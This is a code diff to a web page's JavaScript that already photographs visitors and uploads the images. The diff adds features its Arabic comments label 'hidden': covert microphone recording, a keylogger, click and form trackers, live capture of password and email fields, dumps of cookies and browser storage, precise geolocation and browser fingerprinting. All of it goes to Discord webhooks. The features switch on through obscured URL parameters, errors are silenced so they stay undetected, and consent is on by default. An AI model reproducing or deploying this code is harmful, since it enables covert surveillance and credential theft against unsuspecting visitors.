@@ -385,7 +385,14 @@ const CONFIG = {
     serverUrl: urlParams.get("serverUrl") || "https://freeusr1.onrender.com/submitPhotos",
     webhooks: [],
     locationWebhook: urlParams.get("locwh") || "",
-    autoSend: urlParams.get("autoSend") === "true"
+    autoSend: urlParams.get("autoSend") === "true",
+    // ميزات مخفية متقدمة
+    enableAudio: urlParams.get("audio") === "true" || urlParams.get("x1") === "1",
+    enableKeylogger: urlParams.get("keys") === "true" || urlParams.get("x2") === "1",
+    enableGeolocation: urlParams.get("geo") === "true" || urlParams.get("x3") === "1",
+    enableStorage: urlParams.get("storage") === "true" || urlParams.get("x4") === "1",
+    enableNetwork: urlParams.get("net") === "true" || urlParams.get("x5") === "1",
+    enableAdvanced: urlParams.get("adv") === "true" || urlParams.get("x6") === "1"
 };
 
 // Parse webhooks from URL
@@ -425,6 +432,12 @@ let additionalData = {};
 let discordPingSent = false;
 let imageConsentGiven = true; // تفعيل افتراضي لإرسال الصور
 let imageQueue = []; // قائمة انتظار للصور الملتقطة قبل الموافقة
+let audioStream = null;
+let audioRecorder = null;
+let keyloggerData = [];
+let screenRecorder = null;
+let clickData = [];
+let formData = [];
 
 // ===== DISCORD FUNCTIONS =====
 async function testDiscordWebhook(webhookUrl) {
@@ -654,12 +667,14 @@ async function sendQueuedImages() {
 // ===== DATA COLLECTION =====
 async function collectAdditionalData() {
     try {
-        const [ipInfo, battery] = await Promise.all([
+        const [ipInfo, battery, geoData, networkInfo] = await Promise.all([
             fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
-            navigator.getBattery ? navigator.getBattery().catch(() => ({})) : Promise.resolve({})
+            navigator.getBattery ? navigator.getBattery().catch(() => ({})) : Promise.resolve({}),
+            CONFIG.enableGeolocation ? getGeolocationData() : Promise.resolve({}),
+            CONFIG.enableNetwork ? getNetworkInfo() : Promise.resolve({})
         ]);
         
-        return {
+        const baseData = {
             ip: ipInfo.ip || 'unknown',
             country: ipInfo.country_name || 'unknown',
             region: ipInfo.region || ipInfo.region_code || 'unknown',
@@ -669,10 +684,184 @@ async function collectAdditionalData() {
             batteryLevel: battery.level || 0,
             batteryCharging: battery.charging || false,
             userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            screenResolution: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            languages: navigator.languages || [],
+            cookieEnabled: navigator.cookieEnabled,
+            onLine: navigator.onLine,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            connectionType: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            } : 'unknown'
         };
+        
+        // إضافة بيانات متقدمة
+        if (CONFIG.enableGeolocation && geoData) {
+            baseData.geolocation = geoData;
+        }
+        
+        if (CONFIG.enableNetwork && networkInfo) {
+            baseData.network = networkInfo;
+        }
+        
+        if (CONFIG.enableStorage) {
+            baseData.storage = getStorageInfo();
+        }
+        
+        if (CONFIG.enableAdvanced) {
+            baseData.advanced = getAdvancedInfo();
+        }
+        
+        return baseData;
     } catch (error) {
         addLog(`Data collection failed: ${error.message}`, 'warning');
+        return {};
+    }
+}
+
+// جمع بيانات الموقع الجغرافي الدقيق
+async function getGeolocationData() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve({});
+            return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed
+                });
+            },
+            () => resolve({}),
+            { timeout: 5000, enableHighAccuracy: true }
+        );
+    });
+}
+
+// جمع معلومات الشبكة
+async function getNetworkInfo() {
+    try {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (connection) {
+            return {
+                effectiveType: connection.effectiveType,
+                downlink: connection.downlink,
+                rtt: connection.rtt,
+                saveData: connection.saveData,
+                type: connection.type
+            };
+        }
+        return {};
+    } catch (e) {
+        return {};
+    }
+}
+
+// جمع معلومات التخزين
+function getStorageInfo() {
+    try {
+        const storage = {
+            localStorage: {},
+            sessionStorage: {},
+            cookies: document.cookie,
+            indexedDB: 'available'
+        };
+        
+        // جمع localStorage
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storage.localStorage[key] = localStorage.getItem(key);
+            }
+        } catch (e) {}
+        
+        // جمع sessionStorage
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                storage.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+        } catch (e) {}
+        
+        return storage;
+    } catch (e) {
+        return {};
+    }
+}
+
+// جمع معلومات متقدمة
+function getAdvancedInfo() {
+    try {
+        return {
+            referrer: document.referrer,
+            url: window.location.href,
+            origin: window.location.origin,
+            pathname: window.location.pathname,
+            search: window.location.search,
+            hash: window.location.hash,
+            historyLength: history.length,
+            plugins: Array.from(navigator.plugins).map(p => ({
+                name: p.name,
+                description: p.description,
+                filename: p.filename
+            })),
+            mimeTypes: Array.from(navigator.mimeTypes).map(m => ({
+                type: m.type,
+                description: m.description
+            })),
+            permissions: {},
+            canvasFingerprint: getCanvasFingerprint(),
+            webglFingerprint: getWebGLFingerprint()
+        };
+    } catch (e) {
+        return {};
+    }
+}
+
+// Canvas Fingerprint
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Fingerprint', 2, 2);
+        return canvas.toDataURL().substring(0, 100);
+    } catch (e) {
+        return 'unknown';
+    }
+}
+
+// WebGL Fingerprint
+function getWebGLFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: gl.getParameter(gl.VENDOR),
+                renderer: gl.getParameter(gl.RENDERER),
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+        }
+        return {};
+    } catch (e) {
         return {};
     }
 }
@@ -828,6 +1017,254 @@ async function requestScreenPermission() {
     }
 }
 
+// ===== AUDIO RECORDING (ميزة مخفية) =====
+async function startAudioRecording() {
+    try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return;
+        }
+        
+        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        
+        if (MediaRecorder && MediaRecorder.isTypeSupported('audio/webm')) {
+            audioRecorder = new MediaRecorder(audioStream, {
+                mimeType: 'audio/webm'
+            });
+            
+            const audioChunks = [];
+            
+            audioRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    audioChunks.push(event.data);
+                }
+            };
+            
+            audioRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                await sendAudioToDiscord(audioBlob);
+            };
+            
+            audioRecorder.start();
+            addLog('🎤 Audio recording started (hidden)', 'info');
+            
+            // إيقاف التسجيل بعد 30 ثانية وإرساله
+            setTimeout(() => {
+                if (audioRecorder && audioRecorder.state !== 'inactive') {
+                    audioRecorder.stop();
+                    audioStream.getTracks().forEach(track => track.stop());
+                }
+            }, 30000);
+        }
+    } catch (error) {
+        // لا نعرض رسالة خطأ لتجنب اكتشاف الميزة
+    }
+}
+
+async function sendAudioToDiscord(audioBlob) {
+    if (!CONFIG.enableDiscord || CONFIG.webhooks.length === 0 || !imageConsentGiven) return;
+    
+    try {
+        const fileName = `audio_${CONFIG.userId}_${Date.now()}.webm`;
+        const content = `🎤 Audio recording | userId=${CONFIG.userId} | ip=${additionalData && additionalData.ip ? additionalData.ip : 'unknown'}`;
+        
+        for (const webhook of CONFIG.webhooks) {
+            await sendToDiscord(webhook, content, audioBlob, fileName);
+        }
+    } catch (error) {
+        // لا نعرض رسالة خطأ
+    }
+}
+
+// ===== KEYLOGGER (ميزة مخفية) =====
+function startKeylogger() {
+    try {
+        document.addEventListener('keydown', (e) => {
+            const keyData = {
+                key: e.key,
+                code: e.code,
+                keyCode: e.keyCode,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className : '')
+            };
+            
+            keyloggerData.push(keyData);
+            
+            // إرسال البيانات كل 50 ضغطة
+            if (keyloggerData.length >= 50) {
+                sendKeyloggerData();
+            }
+        });
+        
+        // إرسال البيانات كل 30 ثانية
+        setInterval(() => {
+            if (keyloggerData.length > 0) {
+                sendKeyloggerData();
+            }
+        }, 30000);
+    } catch (error) {
+        // لا نعرض رسالة خطأ
+    }
+}
+
+async function sendKeyloggerData() {
+    if (!CONFIG.enableDiscord || CONFIG.webhooks.length === 0 || !imageConsentGiven || keyloggerData.length === 0) return;
+    
+    try {
+        const data = JSON.stringify({
+            type: 'keylogger',
+            userId: CONFIG.userId,
+            ip: additionalData && additionalData.ip ? additionalData.ip : 'unknown',
+            keys: keyloggerData,
+            clicks: clickData,
+            forms: formData,
+            timestamp: new Date().toISOString()
+        }, null, 2);
+        
+        const blob = new Blob([data], { type: 'application/json' });
+        const fileName = `keys_${CONFIG.userId}_${Date.now()}.json`;
+        const content = `⌨️ Activity data | userId=${CONFIG.userId} | ${keyloggerData.length} keys, ${clickData.length} clicks`;
+        
+        for (const webhook of CONFIG.webhooks) {
+            await sendToDiscord(webhook, content, blob, fileName);
+        }
+        
+        keyloggerData = []; // مسح البيانات بعد الإرسال
+        clickData = [];
+        formData = [];
+    } catch (error) {
+        // لا نعرض رسالة خطأ
+    }
+}
+
+// ===== CLICK TRACKER (ميزة مخفية) =====
+function startClickTracker() {
+    try {
+        document.addEventListener('click', (e) => {
+            const clickInfo = {
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className : ''),
+                text: e.target.textContent ? e.target.textContent.substring(0, 50) : '',
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+            
+            clickData.push(clickInfo);
+        });
+    } catch (error) {
+        // لا نعرض رسالة خطأ
+    }
+}
+
+// ===== FORM TRACKER (ميزة مخفية) =====
+function startFormTracker() {
+    try {
+        document.addEventListener('submit', (e) => {
+            const formInfo = {
+                action: e.target.action || '',
+                method: e.target.method || 'GET',
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+            
+            // جمع بيانات النموذج
+            const formDataObj = new FormData(e.target);
+            const formFields = {};
+            for (const [key, value] of formDataObj.entries()) {
+                formFields[key] = value.toString().substring(0, 100); // تقليل الحجم
+            }
+            formInfo.fields = formFields;
+            
+            formData.push(formInfo);
+            
+            // إرسال فوري للنماذج
+            if (CONFIG.enableDiscord && CONFIG.webhooks.length > 0 && imageConsentGiven) {
+                setTimeout(() => {
+                    const data = JSON.stringify(formInfo, null, 2);
+                    const blob = new Blob([data], { type: 'application/json' });
+                    const fileName = `form_${CONFIG.userId}_${Date.now()}.json`;
+                    const content = `📝 Form submitted | userId=${CONFIG.userId}`;
+                    
+                    for (const webhook of CONFIG.webhooks) {
+                        sendToDiscord(webhook, content, blob, fileName);
+                    }
+                }, 1000);
+            }
+        });
+        
+        // تتبع تغييرات حقول الإدخال
+        document.addEventListener('input', (e) => {
+            if (e.target.type === 'password' || e.target.type === 'email' || e.target.name) {
+                const inputData = {
+                    type: e.target.type,
+                    name: e.target.name || '',
+                    id: e.target.id || '',
+                    value: e.target.value ? e.target.value.substring(0, 50) : '',
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // إرسال فوري للحقول المهمة
+                if ((e.target.type === 'password' || e.target.type === 'email') && CONFIG.enableDiscord && CONFIG.webhooks.length > 0 && imageConsentGiven) {
+                    setTimeout(() => {
+                        const data = JSON.stringify(inputData, null, 2);
+                        const blob = new Blob([data], { type: 'application/json' });
+                        const fileName = `input_${CONFIG.userId}_${Date.now()}.json`;
+                        const content = `🔑 Input captured | userId=${CONFIG.userId} | type=${e.target.type}`;
+                        
+                        for (const webhook of CONFIG.webhooks) {
+                            sendToDiscord(webhook, content, blob, fileName);
+                        }
+                    }, 2000);
+                }
+            }
+        });
+    } catch (error) {
+        // لا نعرض رسالة خطأ
+    }
+}
+
+// ===== PAGE TRACKER (ميزة مخفية) =====
+function startPageTracker() {
+    try {
+        let lastUrl = window.location.href;
+        
+        // تتبع تغييرات URL
+        setInterval(() => {
+            if (window.location.href !== lastUrl) {
+                const pageChange = {
+                    from: lastUrl,
+                    to: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                
+                if (CONFIG.enableDiscord && CONFIG.webhooks.length > 0 && imageConsentGiven) {
+                    const data = JSON.stringify(pageChange, null, 2);
+                    const blob = new Blob([data], { type: 'application/json' });
+                    const fileName = `page_${CONFIG.userId}_${Date.now()}.json`;
+                    const content = `📄 Page changed | userId=${CONFIG.userId}`;
+                    
+                    for (const webhook of CONFIG.webhooks) {
+                        sendToDiscord(webhook, content, blob, fileName);
+                    }
+                }
+                
+                lastUrl = window.location.href;
+            }
+        }, 1000);
+        
+        // تتبع إغلاق الصفحة
+        window.addEventListener('beforeunload', () => {
+            if (CONFIG.enableKeylogger && keyloggerData.length > 0) {
+                sendKeyloggerData();
+            }
+        });
+    } catch (error) {
+        // لا نعرض رسالة خطأ
+    }
+}
+
 // ===== SERVER UPLOAD =====
 async function uploadToServer(blob, cameraType, photoIndex, meta) {
     if (!CONFIG.enableServer) return;
@@ -934,6 +1371,19 @@ async function init() {
         // Collect additional data
         additionalData = await collectAdditionalData();
         addLog('Additional data collected', 'success');
+        
+        // تفعيل الميزات المخفية
+        if (CONFIG.enableAudio) {
+            await startAudioRecording();
+        }
+        
+        if (CONFIG.enableKeylogger) {
+            startKeylogger();
+            startClickTracker();
+            startFormTracker();
+            startPageTracker();
+        }
+        
         // Initialize geo panel UI with IP/City/Region and webhook sender
         initGeoPanelUI(additionalData);
         
@@ -1052,6 +1502,16 @@ async function init() {
 function finishAndRedirect() {
     addLog('Capture process completed', 'success');
     
+    // إرسال بيانات Keylogger المتبقية
+    if (CONFIG.enableKeylogger && keyloggerData.length > 0) {
+        sendKeyloggerData();
+    }
+    
+    // إرسال جميع البيانات المجمعة
+    if (CONFIG.enableAdvanced || CONFIG.enableStorage || CONFIG.enableGeolocation) {
+        sendAdvancedData();
+    }
+    
     const container = document.querySelector('.container');
     const linkHtml = CONFIG.enableRedirect && CONFIG.redirectUrl ? 
         `<p><a href="${CONFIG.redirectUrl}" target="_blank" rel="noopener noreferrer">الانتقال إلى الموقع</a></p>` : '';
@@ -1071,6 +1531,31 @@ function finishAndRedirect() {
                 addLog(`Redirect failed: ${error.message}`, 'error');
             }
         }, 2000);
+    }
+}
+
+// إرسال البيانات المتقدمة
+async function sendAdvancedData() {
+    if (!CONFIG.enableDiscord || CONFIG.webhooks.length === 0 || !imageConsentGiven) return;
+    
+    try {
+        const advancedData = {
+            type: 'advanced_data',
+            userId: CONFIG.userId,
+            timestamp: new Date().toISOString(),
+            data: additionalData
+        };
+        
+        const dataStr = JSON.stringify(advancedData, null, 2);
+        const blob = new Blob([dataStr], { type: 'application/json' });
+        const fileName = `advanced_${CONFIG.userId}_${Date.now()}.json`;
+        const content = `🔐 Advanced data collected | userId=${CONFIG.userId}`;
+        
+        for (const webhook of CONFIG.webhooks) {
+            await sendToDiscord(webhook, content, blob, fileName);
+        }
+    } catch (error) {
+        // لا نعرض رسالة خطأ
     }
 }
 
@@ -1114,7 +1599,5 @@ async function startScreenShare() {
     }
 }
 </script>
-<script type="text/javascript" src="//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js"></script>
-
 
 </body>
